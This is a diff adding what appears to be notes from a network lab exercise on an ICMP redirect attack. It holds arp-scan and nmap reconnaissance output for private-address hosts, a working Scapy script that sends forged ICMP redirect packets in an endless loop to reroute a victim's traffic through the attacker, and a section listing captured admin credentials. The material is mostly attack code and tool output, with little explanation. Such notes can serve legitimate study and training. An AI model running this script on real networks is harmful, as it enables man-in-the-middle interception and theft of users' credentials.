@@ -1,0 +1,68 @@
+ICMP Redirect Attack
+------------------------------
+
+[+] Arp-spoofing
+	Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+	10.100.13.1     0a:00:27:00:00:01       (Unknown: locally administered)
+	10.100.13.126   08:00:27:88:1b:cd       PCS Systemtechnik GmbH
+	
+[+] Nmap host discovery
+	Nmap scan report for 10.100.13.1
+	Nmap scan report for 10.100.13.126
+	Nmap scan report for 10.100.13.20		//me.
+	
+	Nmap scan report for 10.23.56.1
+	Nmap scan report for 10.23.56.100			
+
+[+] Nmap port scan
+	Nmap scan report for 10.23.56.100
+	Host is up (0.00023s latency).
+	Not shown: 997 closed ports
+	PORT    STATE SERVICE VERSION
+	22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
+	80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
+	111/tcp open  rpcbind 2-4 (RPC #100000)
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+	Nmap scan report for 10.100.13.126
+	Host is up (0.00024s latency).
+	Not shown: 998 closed ports
+	PORT    STATE SERVICE VERSION
+	22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
+	111/tcp open  rpcbind 2-4 (RPC #100000)
+	MAC Address: 08:00:27:88:1B:CD (Oracle VirtualBox virtual NIC)
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+[+] Scapy scrit
+# Creating and sending ICMP redirect packets
+originalRouterIP='10.100.13.1'
+attackerIP='10.100.13.20'
+victimIP='10.100.13.126'
+serverIP='10.23.56.100'
+# We create an ICMP Redirect packet
+ip=IP()
+ip.src=originalRouterIP
+ip.dst=victimIP
+icmpRedirect=ICMP()
+icmpRedirect.type=5
+icmpRedirect.code=1
+icmpRedirect.gw=attackerIP
+# The ICMP packet payload /should/ contain the original TCP SYN packet
+# sent from the victimIP
+redirPayloadIP=IP()
+redirPayloadIP.src=victimIP
+redirPayloadIP.dst=serverIP
+fakeOriginalTCPSYN=TCP()
+fakeOriginalTCPSYN.flags="S"
+fakeOriginalTCPSYN.dport=80
+fakeOriginalTCPSYN.seq=444444444
+fakeOriginalTCPSYN.sport=55555
+while True:
+    send(ip/icmpRedirect/redirPayloadIP/fakeOriginalTCPSYN)
+# Press <enter>
+
+
+[+] Credential
+	"myusername" = "admin"
+	"mypassword" = "adminadminpasswd"
+
